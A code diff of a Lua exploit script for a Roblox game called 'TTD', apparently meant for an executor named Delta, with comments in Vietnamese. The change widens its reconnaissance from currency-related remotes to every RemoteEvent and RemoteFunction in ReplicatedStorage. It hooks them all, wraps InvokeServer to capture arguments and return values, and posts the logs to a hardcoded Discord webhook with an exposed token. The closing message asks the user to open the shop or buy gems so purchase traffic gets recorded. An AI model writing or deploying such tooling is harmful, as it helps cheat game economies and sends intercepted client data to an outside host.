@@ -1,4 +1,4 @@
--- TTD RECON — Delta
+-- TTD FULL REMOTE DUMP + INTERACTION LOG
 local WEBHOOK = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
 
 local function wh(msg)
@@ -9,75 +9,72 @@ local function wh(msg)
             Headers = {["Content-Type"]="application/json"},
             Body = string.format('{"content":"%s"}', msg:gsub('"','\\"'):gsub("\n","\\n"))
         })
-    end, function(e)
-        print("[WH ERROR] "..tostring(e))
     end)
 end
 
--- TEST NGAY
-wh("RECON loaded. Delta OK.")
-print("[RECON] Script chạy. Chờ webhook test...")
+wh("FULL DUMP loaded.")
 
-wait(2)
-
--- HOOK REMOTES
-local KW = {"gem","currency","transfer","balance","coin","credit","spend","purchase","shop","buy","sell","add","remove"}
-
-local function match(n)
-    local l = n:lower()
-    for _,k in ipairs(KW) do if l:find(k) then return true end end
-    return false
-end
-
-local hooked = 0
-local logs = {}
-
-local function hook(p, d)
+-- DUMP TẤT CẢ REMOTES
+local allRemotes = {}
+local function dump(p, d)
     d = d or 0
     if d > 6 then return end
     for _,c in ipairs(p:GetChildren()) do
-        if c:IsA("RemoteEvent") and match(c.Name) then
-            hooked = hooked + 1
-            table.insert(logs, "RE: "..c:GetFullName())
+        if c:IsA("RemoteEvent") then
+            allRemotes[#allRemotes+1] = "RE: "..c:GetFullName()
+        elseif c:IsA("RemoteFunction") then
+            allRemotes[#allRemotes+1] = "RF: "..c:GetFullName()
+        end
+        dump(c, d+1)
+    end
+end
+pcall(function() dump(game.ReplicatedStorage, 0) end)
+wh("TOTAL remotes: "..#allRemotes.."\n"..table.concat(allRemotes,"\n"))
+
+-- HOOK TẤT CẢ — log khi có event/call
+local eventCount = 0
+local function hookAll(p, d)
+    d = d or 0
+    if d > 6 then return end
+    for _,c in ipairs(p:GetChildren()) do
+        if c:IsA("RemoteEvent") then
             c.OnClientEvent:Connect(function(...)
+                eventCount = eventCount + 1
                 local a = {}
                 for i=1,select("#",...) do
                     local v = select(i,...)
-                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,30)..'"'
+                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,40)..'"'
                     elseif typeof(v)=="number" then a[#a+1]=tostring(v)
+                    elseif typeof(v)=="boolean" then a[#a+1]=tostring(v)
+                    elseif typeof(v)=="table" then a[#a+1]="table("..#v..")"
                     else a[#a+1]=typeof(v) end
                 end
-                table.insert(logs, "  >> "..c.Name..": "..table.concat(a,", "))
-                wh("EVENT ["..c.Name.."]: "..table.concat(a,", "))
+                local msg = c.Name..": "..table.concat(a,", ")
+                if eventCount <= 20 then
+                    wh("EVENT["..eventCount.."] "..msg)
+                end
             end)
-        elseif c:IsA("RemoteFunction") and match(c.Name) then
-            hooked = hooked + 1
-            table.insert(logs, "RF: "..c:GetFullName())
+        elseif c:IsA("RemoteFunction") then
             local orig = c.InvokeServer
             c.InvokeServer = function(self, ...)
                 local a = {}
                 for i=1,select("#",...) do
                     local v = select(i,...)
-                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,30)..'"'
+                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,40)..'"'
                     elseif typeof(v)=="number" then a[#a+1]=tostring(v)
+                    elseif typeof(v)=="boolean" then a[#a+1]=tostring(v)
                     else a[#a+1]=typeof(v) end
                 end
-                wh("CALL ["..self.Name.."]: "..table.concat(a,", "))
+                wh("CALL "..self.Name..": "..table.concat(a,", "))
                 local r = orig(self, ...)
                 wh("  RET: "..tostring(r))
                 return r
             end
         end
-        hook(c, d+1)
+        hookAll(c, d+1)
     end
 end
+pcall(function() hookAll(game.ReplicatedStorage, 0) end)
 
-pcall(function()
-    hook(game.ReplicatedStorage, 0)
-end, function(e)
-    wh("HOOK ERROR: "..tostring(e))
-end)
-
--- GHI KẾT QUẢ
-wh("Hooked: "..hooked.." remotes. Logs:\n"..table.concat(logs, "\n"))
-print("[RECON] Hooked "..hooked.." remotes")
+wh("All remotes hooked. BÂY GIỜ: mở shop / bấm top up / mua gem / bất kỳ tương tác nào. Log sẽ gửi webhook.")
+print("[RECON] Chờ tương tác...")
